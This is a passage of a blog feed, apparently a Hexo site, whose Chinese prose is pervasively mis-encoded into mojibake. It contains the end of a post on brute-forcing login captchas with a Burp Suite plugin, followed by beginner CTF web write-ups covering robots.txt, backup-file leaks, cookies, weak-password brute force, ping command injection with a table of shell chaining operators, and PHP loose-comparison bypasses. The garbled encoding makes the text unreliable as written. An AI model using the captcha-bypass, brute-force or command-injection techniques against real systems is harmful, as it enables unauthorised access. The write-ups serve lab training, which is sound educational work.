<td>æ­£åˆ™è¡¨è¾¾å¼,é€‚åˆæ¯”è¾ƒå¤æ‚çš„åŒ¹é…ã€‚æ¯”å¦‚æ¥å£è¿”å›åŒ…{â€œcoedeâ€:1,â€œresultâ€:â€œabcdâ€}è¯´æ˜abcdæ˜¯è¯†åˆ«ç»“æœï¼Œæˆ‘ä»¬å¯ä»¥ç¼–å†™è§„åˆ™ä¸ºresult&quot;:â€œ(.*?)â€}</td>
</tr>
<tr>
<td>3</td>
<td>Define  the start and end positions</td>
<td>å®šä¹‰å¼€å§‹å’Œç»“æŸä½ç½®,ä½¿ç”¨ä¸Šé¢çš„ä¾‹å­ï¼Œå¯ä»¥ç¼–å†™è§„åˆ™{â€œstartâ€:21,â€œendâ€:25}</td>
</tr>
<tr>
<td>4</td>
<td>Defines  the start and end strings</td>
<td>å®šä¹‰å¼€å§‹å’Œç»“æŸå­—ç¬¦ï¼Œä½¿ç”¨ä¸Šé¢çš„ä¾‹å­ï¼Œå¯ä»¥ç¼–å†™è§„åˆ™ä¸º{â€œstartâ€:â€œresultâ€:â€œ,â€œendâ€:â€â€œ}â€}</td>
</tr>
</tbody>
</table>
<p>ç¡®è®¤è¯†åˆ«æ— è¯¯ä¹‹åï¼Œç‚¹å‡»é”å®šï¼Œé¿å…ä¸€ä¼šè¿›è¡Œçˆ†ç ´æ—¶å‡ºé”™</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å»æŠ“å–ç™»å½•ç•Œé¢å‘é€çš„åŒ…ï¼Œç„¶åå‘é€åˆ°intruderé¢æ¿ï¼Œç„¶åè®¾ç½®å‚æ•°<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/AHZMTVCB%60RAA%28X4X3MKI%28GI.png" alt=""><br>
éªŒè¯ç çš„pyloadé€‰æ‹©æˆ‘ä»¬çš„æ’ä»¶è¿›è¡Œç”Ÿæˆ<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/VI%256A%7BKPX3DTJSZU5T%25Y0P3.png" alt=""><br>
æˆåŠŸæ‹¿åˆ°å¯†ç <br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/%5BS2N%29%5BR%7BF%7D4OJHTGJ0QDB%7B3.png" alt=""></p>
<p><strong>æ³¨ï¼šæœ¬åšå®¢ä»…ä¾›æŠ€æœ¯ç ”ç©¶ï¼Œè‹¥å°†å…¶ä¿¡æ¯åšå…¶ä»–ç”¨é€”ï¼Œç”±ç”¨æˆ·æ‰¿æ‹…å…¨éƒ¨æ³•å¾‹åŠè¿å¸¦è´£ä»»ï¼Œæœ¬åšå®¢ä¸æ‰¿æ‹…ä»»ä½•æ³•å¾‹åŠè¿å¸¦è´£ä»»ï¼Œè¯·éµå®ˆä¸­åäººæ°‘å…±å’Œå›½å®‰å…¨æ³•</strong></p>
]]></content>
      <tags>
        <tag>æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>æ”»é˜²ä¸–ç•ŒWebåŒº~æŒç»­æ›´æ–°ä¸­ï¼</title>
    <url>/posts/14571/</url>
    <content><![CDATA[<h1>æ–°æ‰‹ç»ƒä¹ åŒº</h1>
<ul>
<li>
<h2 id="view-source"><a class="header-anchor" href="#view-source">Â¶</a>view source</h2>
<hr>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/NE96%7DBO%60EX%28%5B%40YGU%25FPT%29I3.png" alt=""></p>
<p>é¢˜ç›®æç¤ºæŸ¥çœ‹æºä»£ç ï¼Œä½†æ— æ³•ä½¿ç”¨å³é”®æ‰“å¼€å¼€å‘è€…æ¨¡å¼ï¼Œæˆ‘ä»¬è¿™ä¸ªæ—¶å€™å¯ä»¥ä½¿ç”¨f12å¿«æ·é”®æ‰“å¼€å¼€å‘è€…æ¨¡å¼</p>
<br>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%242%29AW49Y%5BP5%407W%7BM8%7D%25S%40%25R.png" alt=""></p>
<br>
<p>flagå°±è—åœ¨æºä»£ç é‡Œï¼Œæˆ‘ä»¬æ“ç»ƒèµ·cvå¤§æ³•ï¼Œç„¶åæäº¤æ‹¿åˆ†~~~</p>
</li>
<li>
<h2 id="robots"><a class="header-anchor" href="#robots">Â¶</a>robots</h2>
<hr>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/_6%5D5%7B%7DXV%29FML%60R14%7DQMV9N4.png" alt=""></p>
<br>
<blockquote>
<p>Robotsåè®®æ˜¯Webç«™ç‚¹å’Œæœç´¢å¼•æ“çˆ¬è™«äº¤äº’çš„ä¸€ç§æ–¹å¼ï¼ŒRobots.txtæ˜¯å­˜æ”¾åœ¨ç«™ç‚¹æ ¹ç›®å½•ä¸‹çš„ä¸€ä¸ªçº¯æ–‡æœ¬æ–‡ä»¶ã€‚è¯¥æ–‡ä»¶å¯ä»¥æŒ‡	å®šæœç´¢å¼•æ“çˆ¬è™«åªæŠ“å–æŒ‡å®šçš„å†…å®¹ï¼Œæˆ–è€…æ˜¯ç¦æ­¢æœç´¢å¼•æ“çˆ¬è™«æŠ“å–ç½‘ç«™çš„éƒ¨åˆ†æˆ–å…¨éƒ¨å†…å®¹ã€‚å½“ä¸€ä¸ªæœç´¢å¼•æ“çˆ¬è™«è®¿é—®ä¸€ä¸ªç«™ç‚¹æ—¶ï¼Œå®ƒä¼šé¦–å…ˆæ£€æŸ¥è¯¥ç«™ç‚¹æ ¹ç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨robots.txtï¼Œå¦‚æœå­˜åœ¨ï¼Œæœç´¢å¼•æ“çˆ¬è™«å°±ä¼šæŒ‰ç…§è¯¥æ–‡ä»¶ä¸­çš„å†…å®¹æ¥ç¡®å®šè®¿é—®çš„èŒƒå›´ï¼›å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆæœç´¢å¼•æ“çˆ¬è™«å°±æ²¿ç€é“¾æ¥æŠ“å–ã€‚å¦å¤–ï¼Œrobots.txtå¿…é¡»æ”¾ç½®åœ¨ä¸€ä¸ªç«™ç‚¹çš„æ ¹ç›®å½•ä¸‹ï¼Œè€Œä¸”æ–‡ä»¶åå¿…é¡»å…¨éƒ¨å°å†™ã€‚</p>
</blockquote>
<br>
<p>æ‰€ä»¥æˆ‘ä»¬åœ¨urlè¾“å…¥robots.txt</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/H%5BM%5D%25%29J%5BP89Q9BM2U8~11VI.png" alt=""></p>
<p>è·³è½¬åˆ°é¡µé¢ï¼Œæç¤ºæˆ‘ä»¬è¿˜æœ‰ä¸ªf1ag_1s_h3re.php,æˆ‘ä»¬ç»§ç»­è®¿é—®æ–‡ä»¶</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%7BQ%25D9C7260DI5L%5BSMIY8X2G.png" alt=""></p>
<br>
<p>å³å¯æ‹¿åˆ°flagå‘¦~</p>
</li>
<li>
<h2 id="backup"><a class="header-anchor" href="#backup">Â¶</a>backup</h2>
<hr>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/4VR%40591%60F0%7D%5BYOQ%40X5%5D%7BYEF.png" alt=""></p>
<br>
<p>è¿™é“é¢˜æç¤ºæˆ‘ä»¬æ˜¯æ–‡ä»¶å¤‡ä»½ï¼Œæ–‡ä»¶æ³„éœ²çš„é—®é¢˜</p>
<p>å¸¸è§çš„å¤‡ä»½æ–‡ä»¶åä¸ºï¼šindex.php~å’Œindex.php.bak</p>
<p>è¯•ç€è¾“å…¥äº†ä¸€ä¸‹ï¼Œæ²¡æƒ³åˆ°æˆåŠŸä¸‹è½½äº†æ–‡ä»¶ï¼Œæ‰“å¼€æ–‡ä»¶ï¼Œå³å¯å¾—åˆ°flagå—·~</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>å¤‡ä»½æ–‡ä»¶<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        body&#123;</span><br><span class="line"><span class="css">            <span class="selector-tag">margin-left</span><span class="selector-pseudo">:auto</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">margin-right</span><span class="selector-pseudo">:auto</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">margin-TOP</span><span class="selector-pseudo">:200PX</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">width</span><span class="selector-pseudo">:20em</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>ä½ çŸ¥é“index.phpçš„å¤‡ä»½æ–‡ä»¶åå—ï¼Ÿ<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">?php</span></span></span><br><span class="line"><span class="tag">$<span class="attr">flag</span>=<span class="string">&quot;Cyberpeace&#123;855A1C4B3401294CB6604CCC98BDE334&#125;&quot;</span></span></span><br><span class="line"><span class="tag">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<br>
<p>æœ¬é¢˜ä¹Ÿå¯ä½¿ç”¨ç›®å½•éå†æœç´¢</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Y2LMCC%25TTM%5D%7BJ474Q3N42%5BD.png" alt=""></p>
<p>æ„Ÿè§‰è‡ªå·±æ˜¯ä¸æ˜¯æœ‰ç‚¹å‰å®³äº†ç°åœ¨,æ“ç»ƒèµ·å…µå™¨ï¼Œæˆ‘ä»¬ç»§ç»­é—¯å…³ï¼Œå†²å†²å†²~</p>
</li>
<li>
<h2 id="cookie"><a class="header-anchor" href="#cookie">Â¶</a>cookie</h2>
<hr>
<p>æ­¤å…³æç¤ºæˆ‘ä»¬ä¿¡æ¯åœ¨cookieä¸­</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/U1SU0%29T8J378V4ULADE%5DAL5.png" alt=""></p>
<br>
<p>å»æŸ¥çœ‹æ–‡ä»¶çš„è¯·æ±‚å¤´å’Œå“åº”å¤´ä¿¡æ¯</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%2450CQV6YEE5P%40%28SH%29_GUBCQ.png" alt=""></p>
<br>
<p>æç¤ºæˆ‘ä»¬å»æŸ¥çœ‹cookie.phpï¼Œæˆ‘ä»¬å»è®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼Œè®©æˆ‘ä»¬ç»§ç»­çœ‹æ–‡ä»¶å“åº”å¤´</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/N%28OZ%25%7D57V5%7BB_9J%7DJ%28N5K%28J.png" alt=""></p>
<br>
<p>æ‰“å¼€æ–‡ä»¶æŸ¥çœ‹å“åº”å¤´ï¼Œgogogoï¼</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/9W43RJ_R%25UC%7D3W%408%28%24DROGI.png" alt=""></p>
<br>
<p>flagå°±å‡ºç°åœ¨äº†æˆ‘ä»¬é¢å‰ï¼Œé‡‘å¸++ï¼Œå¼€å¿ƒ~</p>
</li>
<li>
<h2 id="disabled-button"><a class="header-anchor" href="#disabled-button">Â¶</a>disabled_button</h2>
<hr>
<p>é¢˜ç›®æç¤ºé¡µé¢æŒ‰é’®ä¸èƒ½æ‰“å¼€ï¼Œç‚¹å‡»äº†å‘ç°ç¡®å®æ‰“ä¸å¼€</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/disabled_button/0QDTUEI%5DW3HBBG_VJKPY%60~S.png" alt=""></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/disabled_button/%5D608EGFTAJL%29U%24AOJALE4%5BX.png" alt=""></p>
<br>
<p>è¿™æ—¶å€™è¿ç”¨åˆ°æˆ‘ä»¬htmlçš„çŸ¥è¯†ï¼Œå‰å°ä¸‡ç‰©å¯æ›´æ”¹ï¼æˆ‘ä»¬æ‰“å¼€æºç ä¿®æ”¹å±æ€§ï¼ŒæŠŠdisabledå»æ‰ï¼ŒæŒ‰é’®å³å¯æ‰“å¼€</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/disabled_button/2F%40%40E_S6P5JDKK%7B~0%60%609BL1.png" alt=""></p>
<br>
<p>ç‚¹å‡»åï¼Œflagå°±å‡ºç°å•¦~</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/disabled_button/17LAH%25%7B9QR%60%7DB%24F%7BSGZ5BMD.png" alt=""></p>
</li>
<li>
<h2 id="weak-auth"><a class="header-anchor" href="#weak-auth">Â¶</a>weak_auth</h2>
<hr>
<p>æœ¬é¢˜æç¤ºä¸ºå¼±å¯†ç çˆ†ç ´</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/weak_auth/7O1MJB2%607W_M~F%60QVKQ4SLL5.png" alt=""></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/weak_auth/YU%60V%60%7B9Y16XM%5BY1Y%28%5B4FZF7.png" alt=""></p>
<br>
<p>æˆ‘ä»¬å°è¯•æŠ“åŒ…æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°æç¤ºæˆ‘ä»¬ç”¨æˆ·åä¸ºadminï¼Œä½¿ç”¨å¯†ç çˆ†ç ´</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/weak_auth/%24R_D76HB0S%409GL%24RMWZ50FM.png" alt=""></p>
<br>
<p>æˆ‘ä»¬ä½¿ç”¨å­—å…¸é…åˆburpsuiteè¿›è¡Œä¸€ä¸ªçˆ†ç ´ï¼Œæœ€åå¾—åˆ°ç»“æœ~ï¼Œåœ¨å“åº”åŒ…é‡Œæ‹¿åˆ°flag</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/weak_auth/VD2TF%7BN%5DP%60F47D%40%7DZI9%60EG8.png" alt=""></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/weak_auth/NA9%25KLH%29H95R14I0E%28%243X46.png" alt=""></p>
</li>
<li>
<h2 id="command-execution"><a class="header-anchor" href="#command-execution">Â¶</a>command_execution</h2>
<hr>
<p>æœ¬é¢˜ç»™äº†æˆ‘ä»¬ä¸€ä¸ªpingé¡µé¢ï¼Œæˆ‘ä»¬å°è¯•pingäº†æœ¬æœºåœ°å€ä¹‹åå›æ˜¾ä¿¡æ¯</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/command_execution/RY~GME%5DY0S%7BCWA11S%28%24KUYE.png" alt=""></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/command_execution/881NMO91RVEV%29%7BO4%5D%29L%7DKTC.png" alt=""></p>
<br>
<p>é¡µé¢å›æ˜¾ping -c 3 127.0.0.1 ï¼Œè¿™é‡Œæç¤ºæˆ‘ä»¬è¿™æ˜¯linuxç³»ç»Ÿï¼Œpingä¸‰æ¬¡ã€‚æˆ‘ä»¬å°è¯•ä½¿ç”¨linuxå‘½ä»¤æ‰§è¡Œï¼ŒåŒæ—¶æ‰§è¡Œå¤šæ¡å‘½ä»¤ï¼Œå‘ç°æœ‰å›æ˜¾</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/command_execution/%7BPQ%7DQ33TMU1UC%297_%25UL3%5BQC%20%281%29.png" alt=""></p>
<br>
<p>äºæ˜¯æˆ‘ä»¬å°è¯•å¯»æ‰¾å¸¦æœ‰flagçš„æ–‡ä»¶~ï¼Œå¯ä»¥ç”¨ï¼›å¤šæ¡æ‰§è¡Œä¹Ÿå¯ä»¥ä½¿ç”¨|åªæ‰§è¡Œåé¢çš„è¯­å¥</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/command_execution/F8F%60R%7DHS%5B_J8UDX%28IQE0%5B26.png" alt=""></p>
<br>
<p>å‘ç°flag.txtå¯ç–‘æ–‡ä»¶ï¼Œæˆ‘ä»¬å»æŸ¥çœ‹ä¸€ä¸‹</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/command_execution/_M4D~KMQ~K%7D%7BKET0TJSEQ31.png" alt=""></p>
<p>è½»è½»æ¾æ¾è·å¾—flagå’¯~</p>
<br>
<p><strong>æ‰©å……çŸ¥è¯†ï¼š</strong></p>
<p>| <strong>å¸¸è§è¿æ¥ç¬¦</strong> | <strong>ä¸¾ä¾‹</strong> | <strong>æ•ˆæœ</strong>                    |<br>
| -------------- | -------- | --------------------------- |<br>
| ;              | A;B      | å…ˆæ‰§è¡ŒAï¼Œå†æ‰§è¡ŒB            |<br>
| &amp;              | A&amp;B      | ç®€å•æ‹¼æ¥ï¼ŒA Bä¹‹é—´æ— åˆ¶çº¦å…³ç³» |<br>
| |             | A|B     | æ˜¾ç¤ºBçš„æ‰§è¡Œç»“æœ             |<br>
| &amp;&amp;             | A&amp;&amp;B     | Aæ‰§è¡ŒæˆåŠŸï¼Œç„¶åæ‰ä¼šæ‰§è¡ŒB    |<br>
| ||           | A||B   | Aæ‰§è¡Œå¤±è´¥ï¼Œç„¶åæ‰ä¼šæ‰§è¡ŒB    |</p>
</li>
<li>
<h2 id="simple-php"><a class="header-anchor" href="#simple-php">Â¶</a>simple_php</h2>
<hr>
<p>æœ¬é¢˜éœ€è¦æˆ‘ä»¬æŒæ¡phpå¼±ç±»å‹æ¯”è¾ƒï¼Œæ‰“å¼€ç¯å¢ƒç»™å‡ºæˆ‘ä»¬ä¸€äº›æºç </p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_php/W%7DIBQVLJ20X%7BPN4H%5BOWVT5S.png" alt=""></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_php/XYN%25%7B%60Q%5BS31GMA4%29B41AA%256.png" alt=""></p>
<p>é¦–å…ˆæˆ‘ä»¬åˆ†æä¸€ä¸‹æºä»£ç ï¼š</p>
<p>1ï¼‰æœ‰includeå‡½æ•°ï¼ŒåŒ…å«äº†config.phpæ–‡ä»¶</p>
<p>2ï¼‰urléœ€è¦æ¥æ”¶å‚æ•°aå’Œå‚æ•°b</p>
<p>3ï¼‰å¦‚æœ$a=0æˆ–è€…$aä¸ºçœŸ,è¾“å‡º$flag1</p>
<p>4ï¼‰å¦‚æœbæ˜¯æ•°å­—æˆ–è€…å­—ç¬¦ä¸²ï¼Œå¦‚æœ$b&gt;1234å°±è¾“å‡º$flag2</p>
<br>
<p>æ€»ç»“ï¼Œæˆ‘ä»¬æ„é€ aå‚æ•°å¾—ç­‰äº0ä¸”ä¸ä¸ºå‡ï¼Œæ„é€ bå‚æ•°&gt;1234ä¸”ä¸èƒ½ä¸ºæ•°å­—å’Œå­—ç¬¦ä¸²ã€‚</p>
<p>ç²—ç•¥æ¥çœ‹ï¼Œè¿™ä¸æ˜¯éš¾ä¸ºæˆ‘ä»¬å—ï¼!ä¸è¿‡å…„å¼Ÿè«æ…Œï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬æƒ³èµ·å‰é¢æ‰€è¯´çš„phpå¼±ç±»å‹æ¯”è¾ƒï¼Œé‚£è¿™å¼±ç±»å‹åˆ°åº•æŒ‡çš„ä»€ä¹ˆå‘¢ï¼Ÿä¸‹é¢æˆ‘ä»¬ä¸€èµ·å­¦ä¹ ä¸€ä¸‹~</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æŒæ¡phpå¼±ç±»å‹æ¯”è¾ƒ</span><br><span class="line">phpä¸­å…¶ä¸­ä¸¤ç§æ¯”è¾ƒç¬¦å·:</span><br><span class="line">&#x3D;&#x3D;ï¼šå…ˆå°†å­—ç¬¦ä¸²ç±»å‹è½¬åŒ–æˆç›¸åŒï¼Œå†æ¯”è¾ƒ</span><br><span class="line">&#x3D;&#x3D;&#x3D;ï¼šå…ˆåˆ¤æ–­ä¸¤ç§å­—ç¬¦ä¸²çš„ç±»å‹æ˜¯å¦ç›¸ç­‰ï¼Œå†æ¯”è¾ƒ</span><br><span class="line">å­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒä½¿ç”¨&#x3D;&#x3D;æ—¶,å­—ç¬¦ä¸²ä¼šå…ˆè½¬æ¢ä¸ºæ•°å­—ç±»å‹å†æ¯”è¾ƒ</span><br><span class="line">var_dump(&#39;a&#39; &#x3D;&#x3D; 0);&#x2F;&#x2F;trueï¼Œæ­¤æ—¶aå­—ç¬¦ä¸²ç±»å‹è½¬åŒ–æˆæ•°å­—ï¼Œå› ä¸ºaå­—ç¬¦ä¸²å¼€å¤´ä¸­æ²¡æœ‰æ‰¾åˆ°æ•°å­—ï¼Œæ‰€ä»¥è½¬æ¢ä¸º0</span><br><span class="line">var_dump(&#39;123a&#39; &#x3D;&#x3D; 123);&#x2F;&#x2F;trueï¼Œè¿™é‡Œ&#39;123a&#39;ä¼šè¢«è½¬æ¢ä¸º123</span><br><span class="line"></span><br><span class="line">var_dump(&#39;a123&#39; &#x3D;&#x3D; 123);&#x2F;&#x2F;falseï¼Œå› ä¸ºphpä¸­æœ‰è¿™æ ·ä¸€ä¸ªè§„å®šï¼šå­—ç¬¦ä¸²çš„å¼€å§‹éƒ¨åˆ†å†³å®šäº†å®ƒçš„å€¼ï¼Œå¦‚æœè¯¥å­—ç¬¦ä¸²ä»¥åˆæ³•çš„æ•°å­—å¼€å§‹ï¼Œåˆ™ä½¿ç”¨è¯¥æ•°å­—è‡³å’Œå®ƒè¿ç»­çš„æœ€åä¸€ä¸ªæ•°å­—ç»“æŸï¼Œå¦åˆ™å…¶æ¯”è¾ƒæ—¶æ•´ä½“å€¼ä¸º0ã€‚</span><br><span class="line">ä¸¾ä¾‹ï¼š</span><br><span class="line">var_dump(&#39;123a1&#39; &#x3D;&#x3D; 123);&#x2F;&#x2F;true</span><br><span class="line">var_dump(&#39;1233a&#39; &#x3D;&#x3D; 123);&#x2F;&#x2F;false</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>çœ‹å®Œä¹‹åï¼Œæ˜¯ä¸æ˜¯çªç„¶æç„¶å¤§æ‚Ÿï¼æ‰€ä»¥æˆ‘ä»¬å°è¯•æ„é€ <strong>a=0a&amp;b=1234a</strong>è¾“å…¥</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_php/DE5%7D3O9%5B%40%40BTDQN%25O%5BSF%7BXU.png" alt=""></p>
<br>
<p>å¦‚æ­¤ï¼Œå–flagå¦‚æ¢å›Šå–ç‰©~</p>
</li>
<li>
<h2 id="get-post"><a class="header-anchor" href="#get-post">Â¶</a>get_post</h2>
<hr>
<p>è¿™é“é¢˜å¾ˆç®€å•ï¼Œå°±æ˜¯è®©æˆ‘ä»¬å‘é€getè¯·æ±‚å’Œpostè¯·æ±‚ã€‚</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/get_post/M%5DGS%5BG%60AJ%7D6A_5J%29L%25LKYZR.png" alt=""></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/get_post/%40%29FMD3S1_I~%25QUZ~%40AK6%5B%7DI.png" alt=""></p>
<br>
<p>é¦–å…ˆæç¤ºæˆ‘ä»¬éœ€è¦å¯¹ä»–å‘é€ä¸€ä¸ªgetè¯·æ±‚ï¼Œæˆ‘ä»¬æ„é€ a=1è¿›è¡Œå‘é€getè¯·æ±‚ï¼Œç„¶åè¿”å›ç»“æœ</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/get_post/KHYZ%25IH3%28%600JE%40WMM%28PIVCU.png" alt=""></p>
<br>
<p>æˆ‘ä»¬å†ç”¨curlå‘é€postè¯·æ±‚ï¼Œä¹Ÿå¯ä½¿ç”¨å…¶ä»–å·¥å…·ï¼Œè¿™é‡Œä½¿ç”¨windowsè‡ªå¸¦çš„curlã€‚ä¸æ‡‚curlå¦‚ä½•ä½¿ç”¨çš„å…„å¼Ÿå¯ç§»æ­¥åˆ°æˆ‘çš„å¦ä¸€ç¯‡åšæ–‡</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/get_post/H6LU%60WBN%5DX2ZGGFUCM3~60V.png" alt=""></p>
<br>
<p>è¿”å›çš„ç»“æœä¸­å«æœ‰flagï¼Œokï¼Œæ­¤é¢˜é€šå…³ï¼</p>
</li>
<li>
<h2 id="xff-referer"><a class="header-anchor" href="#xff-referer">Â¶</a>xff_referer</h2>
<hr>
<p>é¢˜ç›®å‘Šè¯‰æˆ‘ä»¬æ˜¯xff_refererï¼ŒçŒœæµ‹æ˜¯ä¸xffå’Œrefererç›¸å…³ï¼Œæ‰“å¼€ç¯å¢ƒçœ‹çœ‹</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/xff_referer/3N%5DA%7D%5DDIH~K4SN8%5B%299CDX0Y.png" alt=""></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/xff_referer/A_0D%40SG%28AGK0VCPC1%401N~UE.png" alt=""></p>
<br>
<p>æˆ‘ä»¬å…ˆå­¦ä¹ ä¸€ä¸‹xffå’Œrefererçš„çŸ¥è¯†ï¼š</p>
